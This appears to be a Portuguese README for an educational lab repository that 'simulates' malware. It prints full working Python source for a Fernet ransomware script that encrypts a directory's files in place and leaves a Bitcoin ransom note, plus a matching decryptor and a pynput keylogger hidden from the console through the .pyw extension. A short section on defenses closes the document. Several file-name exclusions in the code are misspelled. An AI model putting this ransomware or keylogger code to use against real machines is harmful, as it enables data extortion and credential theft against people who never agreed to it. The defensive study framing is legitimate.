Projeto Educacional: Simulação de Malware (Ransomware & Keylogger)

Este repositório contém scripts Python desenvolvidos em um ambiente de laboratório controlado para simular o comportamento de Ransomware e Keylogger. O objetivo principal deste desafio é compreender os mecanismos de ataque para fortalecer as estratégias de defesa (Blue Team).

1. Estrutura do Repositório

O projeto está organizado nas seguintes pastas e arquivos:

MALWARE/

ransomware.py: Script de criptografia e geração da chave.

decryptor.py: Script para reverter a criptografia (simulando a chave de resgate).

chave.key: Arquivo gerado que armazena a chave de criptografia (secreta).

test\_files/: Diretório seguro para criar arquivos de teste (documento.txt, foto.jpg).

KEYLOGGER/

keylogger.pyw: Script de captura de teclas (usando pythonw.exe para furtividade).

log.txt: Arquivo onde as teclas capturadas são registradas.

README.md: Este documento.

1. ⚔️ Simulação de Ransomware (Criptografia de Arquivos)

O módulo de Ransomware utiliza a criptografia simétrica

Fernet (baseada em AES) para o ataque e descriptografia.

1. Script de Ataque (ransomware.py)

Este script gera a chave de ataque, varre o diretório test\_files e aplica a criptografia em todos os arquivos não essenciais.

from cryptography.fernet import Fernet

import os

\# Gerar uma chave de criptografia e salvar

def gerar\_chave():

chave = Fernet.generate\_key()

with open("chave.key", "wb") as chave\_file:

chave\_file.write(chave)

\# Carregar chave salva

def carregar\_chave():

return open("chave.key", "rb").read()

\# Criptografar um único arquivo

def criptografar\_arquivo(arquivo, chave):

f = Fernet(chave)

with open(arquivo, "rb") as file:

dados = file.read()

dados\_encriptados = f.encrypt(dados)

\# Sobrescreve o arquivo original com os dados cifrados

with open(arquivo, "wb") as file:

file.write(dados\_encriptados)

\# Encontrar arquivos para criptografar

def encontrar\_arquivos(diretorio):

lista = []

for raiz, \_, arquivos in os.walk(diretorio):

for nome in arquivos:

caminho = os.path.join(raiz, nome)

\# Exclusões para evitar erros (o próprio script e a chave)

if nome != "ransoware.py" and not nome.endswith(".key"):

lista.append(caminho)

return lista

\# Mensagem de resgate

def criar\_mensagem\_resgate():

with open("LEIA ISSO.txt", "w") as f:

f.write("Seus arquivos foram criptografados! \n")

f.write("Envie 1 Bitcoin para o endereço X e envie o comprovante! \n")

f.write("Depois disso, enviaremos a chave para você recuperar seus dados \n")

\# execução principal

def main():

\# Nota: É crucial que o diretório 'test\_files' exista antes da execução.

gerar\_chave()

chave = carregar\_chave()

arquivos = encontrar\_arquivos("test\_files")

for arquivo in arquivos:

criptografar\_arquivo(arquivo, chave)

criar\_mensagem\_resgate()

print("Ransoeare executado! Arquivos criptografados.")

if \_\_name\_\_ == "\_\_main\_\_":

main()


1. Script de Descriptografia (decryptor.py)

Este script simula a recuperação dos dados após a obtenção da chave secreta (no cenário de resgate).

from cryptography.fernet import Fernet

import os

def carregar\_chave():

return open("chave.key", "rb").read()

def descriptografar\_arquivo(arquivo, chave):

f = Fernet(chave)

with open(arquivo, "rb") as file:

dados = file.read()

dados\_descriptografados = f.decrypt(dados)

\# Sobrescreve o arquivo criptografado com os dados originais

with open(arquivo, "wb") as file:

file.write(dados\_descriptografados)

def encontrar\_arquivos(diretorio):

lista = []

for raiz, \_, arquivos in os.walk(diretorio):

for nome in arquivos:

caminho = os.path.join(raiz, nome)

\# Exclusões

if nome != "rasoware.py" and not nome.endswith(".key"):

lista.append(caminho)

return lista

def main():

chave = carregar\_chave()

arquivos = encontrar\_arquivos("test\_files")

for arquivo in arquivos:

descriptografar\_arquivo(arquivo, chave)

print("Descriptografia concluída! Arquivos restaurados.")

if \_\_name\_\_ == "\_\_main\_\_":

main()


3\. 🕵️ Simulação de Keylogger (Captura Furtiva)

O script utiliza a biblioteca pynput para criar um listener de teclado e salvar os dados no log.txt. O uso da extensão .pyw no Windows permite que o script rode sem abrir a janela do console, simulando furtividade.

Script (keylogger.pyw)

from pynput import keyboard

\# Teclas a serem ignoradas (shift, ctrl, alt, etc.)

IGNORAR = {

keyboard.Key.shift,

keyboard.Key.shift\_r,

keyboard.Key.ctrl\_l,

keyboard.Key.ctrl\_r,

keyboard.Key.alt\_l,

keyboard.Key.alt\_r,

keyboard.Key.caps\_lock,

keyboard.Key.cmd

}

def on\_press(key):

try:

\# Se for tecla normal (caractere)

with open('log.txt', 'a', encoding="utf-8") as f:

f.write(key.char)

except AttributeError:

\# Se for tecla especial

with open('log.txt', 'a', encoding="utf-8") as f:

if key == keyboard.Key.space:

f.write(' ')

elif key == keyboard.Key.enter:

f.write('\n')

elif key == keyboard.Key.backspace:

f.write('') # Em um cenário real, removeria o último caractere do log

elif key == keyboard.Key.tab:

f.write('\t')

elif key == keyboard.Key.esc:

\# Condição de parada de laboratório

f.write('[ESC - PARADA]')

return False

elif key in IGNORAR:

pass   # Ignorar teclas de modificação

else:

f.write(f'[{key}]') # Registrar outras teclas especiais (ex: F1, F2)

\# Cria o listener de teclado e inicia a escuta

with keyboard.Listener(on\_press=on\_press) as listener:

listener.join()


4\.Reflexão de Defesa: Estratégias e Mitigação

A essência da Cibersegurança é a defesa. Os experimentos acima destacam os seguintes pontos de vulnerabilidade e as contramedidas necessárias:

1. Defesa contra Ransomware

Backup Estratégico (Regra 3-2-1): A única garantia contra a perda de dados. O backup deve ser segregado (isolado da rede principal, "air-gapped" ou imutável) para que o Ransomware não possa criptografá-lo.

Controle de Aplicações e Whitelisting: Impedir que o Ransomware seja executado. Soluções como AppLocker ou Controle de Aplicativos do Defender podem ser configuradas para permitir apenas executáveis conhecidos.

Segmentação de Rede: Limitar as permissões de acesso a recursos críticos. O Ransomware só pode criptografar os dados que o usuário tem permissão para acessar.

1. Defesa contra Keyloggers e Exfiltração

Antivírus/EDR e Monitoramento de Hooks: Soluções de segurança de endpoint (EDR) detectam comportamentos suspeitos, como processos tentando se anexar a eventos de teclado (pynput faz isso) ou o uso de pythonw.exe.

Firewall de Saída (Outbound): Regras estritas de Firewall para bloquear o protocolo SMTP (portas 25, 465, 587) para todos os programas que não sejam o cliente de e-mail legítimo da empresa. Isso impede a exfiltração de dados por e-mail, mesmo que o Keylogger tenha capturado as informações.

Autenticação Multifator (MFA): O MFA anula a eficácia da captura de senha. Mesmo que o atacante roube a senha, ele não conseguirá fazer login sem o segundo fator de autenticação.
